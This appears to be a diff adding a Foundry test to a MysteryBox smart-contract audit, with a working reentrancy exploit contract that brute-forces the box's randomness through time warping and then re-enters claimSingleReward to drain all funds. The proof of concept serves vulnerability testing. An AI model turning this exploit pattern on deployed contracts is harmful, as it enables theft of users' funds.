@@ -17,6 +17,8 @@ contract MysteryBoxTest is Test {
         user2 = address(0x2);
 
         vm.deal(owner, SEED_VALUE);
+        vm.deal(user1, 1 ether);
+        vm.deal(user2, 1 ether);
         vm.prank(owner);
         mysteryBox = new MysteryBox{value: SEED_VALUE}();
         console2.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
@@ -131,5 +133,102 @@ contract MysteryBoxTest is Test {
         vm.prank(user1);
         mysteryBox.changeOwner(user1);
         assertEq(mysteryBox.owner(), user1);
+    }
+
+    modifier boxesBought() {
+        uint256 boxPrice = mysteryBox.boxPrice();
+        vm.prank(user1);
+        for (uint8 i = 0; i < 3; i++) {
+            mysteryBox.buyBox{value: boxPrice}();
+        }
+        _;
+    }
+
+    function testReentrancy_ClaimAllRewards() public boxesBought {
+        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(mysteryBox);
+        uint256 attackCost = 0.5 ether;
+
+        uint256 initBalAttackerContract = address(reentrancyAttack).balance;
+        uint256 initBalContract = address(mysteryBox).balance;
+
+        console2.log("Initial bal attacker contract: ", initBalAttackerContract);
+        console2.log("Initial bal contract: ", initBalContract);
+
+        vm.prank(user2);
+        reentrancyAttack.attack{value: attackCost}();
+
+        uint256 finalBalContract = address(mysteryBox).balance;
+        uint256 finalBalAttackerContract = address(reentrancyAttack).balance;
+        console2.log("Final bal contract: ", finalBalContract);
+        console2.log("Final bal reentracy contract: ", finalBalAttackerContract);
+
+        assertEq(finalBalAttackerContract, initBalContract + attackCost);
+        assertEq(finalBalContract, 0);
+    }
+}
+
+contract ReentrancyAttack is Test {
+    MysteryBox mysteryBox;
+    uint256 rewardsValue;
+
+    constructor(MysteryBox _mysteryBox) {
+        mysteryBox = _mysteryBox;
+    }
+
+    function calculateRewardValue() public {
+        MysteryBox.Reward[] memory myRewards = mysteryBox.getRewards();
+        uint256 _rewardsValue = rewardsValue;
+
+        for (uint8 i = 0; i < myRewards.length; i++) {
+            _rewardsValue += myRewards[i].value;
+
+            if (rewardsValue > 0) {
+                break;
+            }
+        }
+
+        rewardsValue = _rewardsValue;
+    }
+
+    function obtainReward() public payable {
+        uint256 i = 0;
+
+        while (rewardsValue <= 0) {
+            mysteryBox.buyBox{value: 0.1 ether}();
+            mysteryBox.openBox();
+            calculateRewardValue();
+            i++;
+            console2.log("Attempt: ", i);
+            vm.warp(i);
+        }
+    }
+
+    // function attack() public payable {
+    //     if (rewardsValue <= 0) {
+    //         obtainReward();
+    //     }
+
+    //     if (address(mysteryBox).balance >= rewardsValue) {
+    //         mysteryBox.claimAllRewards();
+    //     }
+    // }
+
+    function attack() public payable {
+        if (rewardsValue <= 0) {
+            obtainReward();
+        }
+
+        if (address(mysteryBox).balance >= rewardsValue) {
+            uint256 index = mysteryBox.getRewards().length - 1;
+            mysteryBox.claimSingleReward(index);
+        }
+    }
+
+    receive() external payable {
+        attack();
+    }
+
+    fallback() external payable {
+        attack();
     }
 }
